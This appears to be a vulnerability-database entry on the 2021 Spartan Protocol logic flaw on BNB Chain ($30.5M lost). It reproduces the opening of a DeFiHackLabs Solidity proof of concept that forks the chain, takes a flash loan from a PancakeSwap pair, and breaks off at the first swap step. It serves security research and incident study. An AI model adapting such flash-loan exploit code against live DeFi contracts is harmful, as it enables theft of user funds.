# [?] Spartan - Logic Flaw

## Summary
Severity: Unknown
Chain: BNB Chain
Component: Spartan
Published: 2021-05-02
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-05/Spartan_exp.sol
Type: defi-exploit-poc

## Details
References:
- https://medium.com/amber-group/exploiting-spartan-protocols-lp-share-calculation-flaws-391437855e74
- https://rekt.news/spartan-rekt/

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost: $30.5M
// Attacker: 0x3b6e77722e2bbe97c1cfa337b42c0939aeb83671
// Attack Contract: 0x288315639c1145f523af6d7a5e4ccf8238cd6a51
// Vulnerable Contract: 0x3de669c4f1f167a8afbc9993e4753b84b576426f
// Attack Tx: https://explorer.phalcon.xyz/tx/bsc/0xb64ae25b0d836c25d115a9368319902c972a0215bd108ae17b1b9617dfb93af8?line=0

// @Analyses
// https://medium.com/amber-group/exploiting-spartan-protocols-lp-share-calculation-flaws-391437855e74
// https://rekt.news/spartan-rekt/

contract Exploit is Test {
    IWBNB private constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 private constant SPARTA = IERC20(0xE4Ae305ebE1AbE663f261Bc00534067C80ad677C);

    IUniswapV2Pair private constant CAKE_WBNB = IUniswapV2Pair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);

    ISpartanPool private constant SPT1_WBNB = ISpartanPool(0x3de669c4F1f167a8aFBc9993E4753b84b576426f); // SPARTAN<>WBNB

    function setUp() public {
        vm.createSelectFork("bsc", 7_048_832);
    }

    function testExploit() public {
        CAKE_WBNB.swap(0, 100_000 ether, address(this), "flashloan 100k WBNB");
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes calldata) external {
        // 1: swap WBNB for SPARTA 5 times
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-05/Spartan_exp.sol_
